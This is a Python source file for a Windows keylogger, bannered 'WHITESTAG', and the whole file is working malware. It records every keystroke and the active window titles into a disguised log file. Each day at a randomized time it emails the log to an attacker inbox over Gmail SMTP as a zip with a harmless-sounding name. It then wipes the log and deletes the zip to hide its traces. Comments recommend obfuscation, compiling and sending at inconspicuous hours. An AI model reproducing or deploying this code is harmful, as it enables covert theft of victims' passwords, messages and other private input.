import json
import os
import smtplib
import socket
import ssl
import time
from ctypes import (byref, create_string_buffer, windll)
from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from random import randrange
from threading import Thread
from zipfile import ZipFile

import keyboard
import requests


def get_time():
    t = time.localtime()
    local_time = time.strftime("%H:%M:%S", t)
    return local_time

def report():
    # ------------------SENDOFF CONFIG-----------------------------
    sender_email = "johndoe@test.com" #where's it coming from?
    receiver_email = "janedoe@test.com" #where's it going?
    password = "supersecure12345" #password for the sender. You should have a full 'sender' account already made on the email
                    #service you want to utilize. plug both the email and the password into these variables.
                    #You'll have the best luck with gmail, because that's what the rest of this is coded for.
    domain = "smtp.gmail.com" #whatever mail server your email uses
    webport = 587
    zipnamelist = ["familyphotos.zip","workstuff.zip","personalbackup.zip","estimate.zip"] #Vary the name of the .zip that shoots off.
    #--------------------------------------------------------------

    global path
    
    localname = socket.gethostbyaddr(socket.gethostname())[0] #Get user computer name
    ip = requests.get('https://checkip.amazonaws.com').text.strip() #get user computer IP. This site usually gets proper results.

    fullbody = MIMEMultipart() # Email text
    fullbody['Subject'] = " ".join(("Report from", localname, ip)) #Give me some gold.
    fullbody['To'] = receiver_email
    fullbody['From'] = sender_email
    fullbody.preamble = f'''
        Report from a servant at {localname} with IP {ip}...
    '''
    zipname = zipnamelist[randrange(len(zipnamelist))]
    zipObj = ZipFile( zipname, "a")
    zipObj.write(path)
    zipObj.close()

    theImmolate = open(path, "w") #Pop the text file.
    theImmolate.truncate()        #Immolate the contents.
    theImmolate.close()           #Close the text file.

    zf = open(zipname, 'rb')
    msg = MIMEBase('application', 'zip') #Generate the container for the .zip attachment.
    msg.set_payload(zf.read())           #Read the zip contents to the payload.
    encoders.encode_base64(msg)          #Encode it all as base 64.
    msg.add_header('Content-Disposition', 'attachment', filename=zipname)
    fullbody.attach(msg) #Attach our attachment to the full body of the email.
    fullbody = fullbody.as_string()
    #Sending the email...
    try:
            # Creating a SMTP session | use 587 with TLS, 465 SSL and 25
            server = smtplib.SMTP(domain, webport)
            # Encrypts the email
            context = ssl.create_default_context()
            server.starttls(context=context)
            # We log in into our Google account
            server.login(sender_email, password)
            # Sending email from sender, to receiver with the email body
            server.sendmail(sender_email, receiver_email, fullbody)
            print('Email sent!')
    except Exception as e:
            print(f'An error has occurred! {e}')
    finally:
            print('Tying off loose ends...')
            server.quit() #Destroy our server!
    zf.close() #close the zip!
    os.remove(zipname) #After I've shot off the .zip, I don't want it hanging around of someone to find.

def recorder():
    global path
    try:
        t = open(path, 'a')
        print("File found. File opened.")
    except:
        t = open(path, 'w+')
        print("File not found. File created.")
    finally:
        print("File closed.")
        t.close()
    
    line = keyboard.record(until='enter')
    check_current_process()
    for x in range(len(line)):
        file_write(keyboard.KeyboardEvent.to_json(line[x]))

def file_write(kr):
    try:
        global path
        kr_dict = json.loads(kr)
        if kr_dict["event_type"] == "down":
            with open(path, 'a') as f:
                key_stroke = kr_dict["name"]

                print(kr_dict['name'])
                
                if key_stroke == "enter":
                    f.write('\n')
                elif key_stroke == 'space':
                    f.write(' ')
                else:
                    f.write(kr_dict['name'])
    except Exception as e:
        print(f'An error has occurred!n {e}')

def check_current_process():
    global OldWindow
    global path

    user32 = windll.user32
    
    #find the foreground
    fgw = user32.GetForegroundWindow()
    windowname = create_string_buffer(512)
    user32.GetWindowTextA(fgw, byref(windowname),512)
    currentname = (os.path.basename(windowname.value)).decode('ascii')
    #hahah funny code haha
    if currentname != OldWindow:
        print(f"[ | {currentname} | ]")
        OldWindow = currentname
        with open(path, 'a') as f:
            f.write(f"[ | {currentname} | ]\n")

def watcher():
        while True:
            recorder()

def waiter():
        while True:
            global sendtime
            global oldsendtime
            global success

            time.sleep(1) #Tick, tock!

            if get_time() == sendtime and success == False:
                oldsendtime = sendtime
                # change up next send-off time to mitigate the formation of patterning
                sendtime = sendtime.replace(sendtime[3:8], (rand60 + ":" + rand60))
                success = True  # Avoid repeat submissions during that same second, maybe change up the fact that it drops the send on-the-dot, hopefully the execution time of the process itself will stagger it
                print("Success! Report triggered. The current time is", oldsendtime, "and the next transmission is scheduled for tomorrow at", sendtime, "and the timer will reset at", dayreset + ".")        
                report()

            if get_time() == dayreset and success == True:
                success = False
                # wait past the hour to enable another submission to avoid repeat submissions

def title(): #Functionally useless. Ideally, this script would have no comments and be obfuscated. And compiled. But whatever.
    print(" ▄█     █▄     ▄█    █▄     ▄█      ███        ▄████████    ▄████████     ███        ▄████████    ▄██████▄  ")
    print("███     ███   ███    ███   ███  ▀█████████▄   ███    ███   ███    ███ ▀█████████▄   ███    ███   ███    ███ ")
    print("███     ███   ███    ███   ███▌    ▀███▀▀██   ███    █▀    ███    █▀     ▀███▀▀██   ███    ███   ███    █▀  ")
    print("███     ███  ▄███▄▄▄▄███▄▄ ███▌     ███   ▀  ▄███▄▄▄       ███            ███   ▀   ███    ███  ▄███        ")
    print("███     ███ ▀▀███▀▀▀▀███▀  ███▌     ███     ▀▀███▀▀▀     ▀███████████     ███     ▀███████████ ▀▀███ ████▄  ")
    print("███     ███   ███    ███   ███      ███       ███    █▄           ███     ███       ███    ███   ███    ███ ")
    print("███ ▄█▄ ███   ███    ███   ███      ███       ███    ███    ▄█    ███     ███       ███    ███   ███    ███ ")
    print(" ▀███▀███▀    ███    █▀    █▀      ▄████▀     ██████████  ▄████████▀     ▄████▀     ███    █▀    ████████▀  ")      

#----------------------VARIABLE INITIALIZATION-----------------------


#Make sure to remove print statements before compiling or whatever. They're messy.
#Make sure to check the sendoff config under the report function.

rand60 = str(randrange(60)).zfill(2) #randomize a number between 0 and 60 and add a 0 to the beginning if it's 0-9 to keep it 2 characters long.

#vvv randomized send time for production (works as of 4/30/2020) Use for final product. vvv

#sendtime = str("15:"+rand60+":"+rand60) #Should be initialized to an hour around noon to keep it transmitting during inconspicuous local times.

#debug send time, so that you don't have to wait 24 hours between debugs.
sendtime = "23:00:00"
oldsendtime = sendtime
dayreset = oldsendtime.replace(oldsendtime[0:8], (str((int(oldsendtime[0:2]) + 1)).zfill(2)+":00:00"))
OldWindow = "None"
success = False
path = "./ProgramData.log"
#------------------------------------------------------------------
title()
print(OldWindow)
# RUN IT
t1 = Thread(target = watcher)
t1.setDaemon(True)
t1.start()
t2 = Thread(target = waiter)
t2.setDaemon(True)
t2.start()
while True:
    time.sleep(4) #This loop will keep the main branch going while the threads operate.
